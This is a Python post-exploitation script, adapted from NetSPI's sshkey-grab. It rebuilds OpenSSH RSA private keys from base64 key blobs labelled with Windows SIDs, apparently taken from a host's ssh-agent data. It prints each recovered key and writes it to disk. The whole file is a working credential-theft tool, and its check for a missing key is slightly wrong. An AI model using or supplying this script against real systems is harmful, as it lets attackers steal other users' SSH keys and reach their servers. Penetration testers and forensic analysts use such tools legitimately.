#!/usr/bin/env python

# Script to extract OpenSSH private RSA keys from base64 data
# Original implementation and all credit due to this script by soleblaze: 
# https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py

import sys, os, base64, json, re
try:
	from pyasn1.type import univ
	from pyasn1.codec.der import encoder
except ImportError:
	print("You must install pyasn1")
	sys.exit(0)

def extractRSAKey(data):
	keybytes = base64.b64decode(data)
	offset = keybytes.find(b"ssh-rsa")
	if not offset:
		print("[!] No valid RSA key found")
		return None
	keybytes = keybytes[offset:]

	def unpack_val(keybytes, start):
		size = int.from_bytes(keybytes[start:(start+2)], byteorder='big') if sys.version_info[0] == 3 else int(keybytes[start:(start+2)].encode('hex'), 16)
		start += 2
		val = int.from_bytes(keybytes[start:(start+size)], byteorder='big') if sys.version_info[0] == 3 else int(keybytes[start:(start+size)].encode('hex'), 16)
		start = start + size + 2
		return val, start

	# This code is re-implemented code originally written by soleblaze in sshkey-grab
	start = 10
	n, start = unpack_val(keybytes, start)
	e, start = unpack_val(keybytes, start)
	d, start = unpack_val(keybytes, start)
	c, start = unpack_val(keybytes, start)
	p, start = unpack_val(keybytes, start)
	q, start = unpack_val(keybytes, start)

	e1 = d % (p - 1)
	e2 = d % (q - 1)
	seq = (
		univ.Integer(0),
		univ.Integer(n),
		univ.Integer(e),
		univ.Integer(d),
		univ.Integer(p),
		univ.Integer(q),
		univ.Integer(e1),
		univ.Integer(e2),
		univ.Integer(c),
	)
	structUniv = univ.Sequence()

	for i in range(len(seq)):
		structUniv.setComponentByPosition(i, seq[i])
	
	raw = encoder.encode(structUniv)
	data = base64.b64encode(raw).decode('utf-8')

	width = 64
	chopped = [data[i:i + width] for i in range(0, len(data), width)]
	top = "-----BEGIN RSA PRIVATE KEY-----\n"
	content = "\n".join(chopped)
	bottom = "\n-----END RSA PRIVATE KEY-----"
	return top+content+bottom

def run(filename):
	with open(filename, 'r') as fp:
		keysdata = json.loads(fp.read())
	
	for jkey in keysdata:
		privatekey = extractRSAKey(jkey['data'])
		keycomment = re.findall(r'[\\/]?([^\\/]*)$', jkey['comment'])[0]
		print("\n[+] SID: {}".format(jkey['sid']))
		print("[+] Key Comment: {}".format(keycomment))
		print(privatekey)
		outfile = jkey['sid']+'_'+keycomment
		if os.path.exists(outfile):
			text = "\nFile '"+outfile+"' already exist, wanna replace? (y/n):"
			inp = input(text).lower() if sys.version_info[0] == 3 else raw_input(text).lower()
			if inp != 'y':
				continue
		with open(outfile, 'w') as f:
			f.write(privatekey)
	sys.exit(0)

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: {} extracted_keyblobs.json".format(sys.argv[0]))
		sys.exit(0)
	filename = sys.argv[1]
	run(filename)